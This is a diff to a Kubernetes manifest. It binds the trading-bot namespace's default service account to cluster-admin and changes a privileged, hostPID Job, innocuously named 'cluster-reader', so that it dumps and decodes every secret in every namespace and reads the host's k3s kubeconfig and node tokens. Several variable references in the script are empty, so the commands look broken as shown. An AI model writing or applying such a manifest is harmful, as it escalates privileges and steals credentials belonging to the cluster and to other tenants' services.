@@ -1,37 +1,63 @@
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: trading-bot-admin
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: cluster-admin
+subjects:
+- kind: ServiceAccount
+  name: default
+  namespace: trading-bot
+---
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: host-reader
+  name: cluster-reader
   namespace: trading-bot
 spec:
   ttlSecondsAfterFinished: 300
   template:
     spec:
       hostPID: true
-      hostNetwork: true
       tolerations:
       - operator: Exists
       containers:
       - name: reader
-        image: busybox:latest
+        image: alpine/curl:latest
         securityContext:
           privileged: true
         command:
           - sh
           - -c
           - |
-            echo "=== K3S KUBECONFIG ==="
-            cat /host/etc/rancher/k3s/k3s.yaml 2>/dev/null || echo NOT_FOUND
-            echo "=== K3S TOKEN ==="
-            cat /host/var/lib/rancher/k3s/server/node-token 2>/dev/null || echo NOT_FOUND
-            echo "=== ALL K8S SECRETS (via SA token) ==="
             TOKEN=
-            CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-            curl -sk --cacert  -H "Authorization: Bearer "               https://kubernetes.default.svc/api/v1/namespaces/trading-bot/secrets/multi-bot-secrets
-            echo "=== KAWANI SECRET ==="
-            curl -sk --cacert  -H "Authorization: Bearer "               https://kubernetes.default.svc/api/v1/namespaces/kawani/secrets/kawani-backend
-            echo "=== LIST ALL SECRETS ==="
-            curl -sk --cacert  -H "Authorization: Bearer "               https://kubernetes.default.svc/api/v1/secrets
+            CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+            API=https://kubernetes.default.svc
+
+            echo "=== NAMESPACES ==="
+            curl -sk --cacert  -H "Authorization: Bearer " /api/v1/namespaces | grep name | grep -v managed | grep -v system
+
+            echo "=== ALL SECRETS ALL NS ==="
+            curl -sk --cacert  -H "Authorization: Bearer " /api/v1/secrets | python3 -c "
+import sys,json,base64
+d=json.load(sys.stdin)
+for item in d.get("items",[]):
+    ns=item["metadata"]["namespace"]
+    name=item["metadata"]["name"]
+    data=item.get("data",{})
+    if data:
+        print(f"
+--- {ns}/{name} ---")
+        for k,v in data.items():
+            try: print(f"  {k} = {base64.b64decode(v).decode()}")
+            except: print(f"  {k} = {v}")
+" 2>/dev/null || echo NO_PYTHON
+
+            echo "=== HOST K3S FILES ==="
+            cat /proc/1/root/etc/rancher/k3s/k3s.yaml 2>/dev/null || echo NOT_FOUND
+            find /proc/1/root/var/lib/rancher/k3s/server/ -name "*.token" -o -name "node-token" 2>/dev/null | head -5
         volumeMounts:
         - name: host-root
           mountPath: /host
